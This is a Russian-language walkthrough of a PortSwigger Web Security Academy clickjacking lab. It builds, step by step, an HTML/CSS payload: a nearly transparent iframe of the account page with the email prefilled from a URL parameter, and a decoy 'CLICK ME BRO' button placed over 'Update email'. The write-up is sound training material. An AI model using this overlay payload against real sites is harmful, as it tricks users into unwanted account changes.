Залогинимся под `wiener:peter`

изменим почту на `change@me.com `
и нажмем `Update email`


Далее, если мы скрафтим в поисковой строке `my-account?email=new@email.com`, то у нас получится предзаполненное поле `email`
```
https://0aa300a804940a2a80758a5f00c80040.web-security-academy.net/my-account?email=new@email.com
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/2.%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/pics%20for%20walkthrough/1.png)

Соответсвенно, нам необходимо будет создать фейковую кнопку для обновления Email, на которую уже нажмет наша жертва, а необходимый email мы уже знаем как подставить

Аналогично прошлой лабораторной работе воспользуемся `iframe`

Перейдем в `Exploit server` и в поле `Body` введем
```
<iframe src="https://0aa300a804940a2a80758a5f00c80040.web-security-academy.net/my-account?email=new@email.com"></iframe>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/2.%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/pics%20for%20walkthrough/2.png)
Отлично, `iframe` работает, только немного не в тех размерах.
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/2.%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/pics%20for%20walkthrough/3.png)

Добавим стилей, чтобы получить полноразмерную страницу
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
</style>

<iframe src="https://0aa300a804940a2a80758a5f00c80040.web-security-academy.net/my-account?email=new@email.com"></iframe>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/2.%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/pics%20for%20walkthrough/4.png)
и увидим что у нас получается предзаполненное поле. Остается добавить кнопку и правильно ее разместить над кнопкой `Update email`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/2.%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/pics%20for%20walkthrough/5.png)

Добавим фейковую кнопку `CLICK ME BRO` через `div` и с помощью стилей опустим ее на уровень кнопки `Update email`
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div{
        position:absolute;
        top:460px;
        left: 50px;
        z-index: 1;
    }
</style>

<div>CLICK ME BRO</div>
<iframe src="https://0aa300a804940a2a80758a5f00c80040.web-security-academy.net/my-account?email=new@email.com"></iframe>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/2.%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/pics%20for%20walkthrough/6.png)

Отлично, у нас получилось. Играть в пиксель перфект смысла нет, и так сойдет
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/2.%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/pics%20for%20walkthrough/7.png)


и установим `opacity` исходной страницы сразу в `0.00001`, чтобы в итоге у нас получилось 

```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.00001;
        z-index: 2;
    }
    div{
        position:absolute;
        top:460px;
        left: 50px;
        z-index: 1;
    }
</style>

<div>CLICK ME BRO</div>
<iframe src="https://0aa300a804940a2a80758a5f00c80040.web-security-academy.net/my-account?email=new@email.com"></iframe>
```

нажмем `Store` -> `Deliver exploit to victim` и получим уведомление об успешно выполненной лабораторной работе
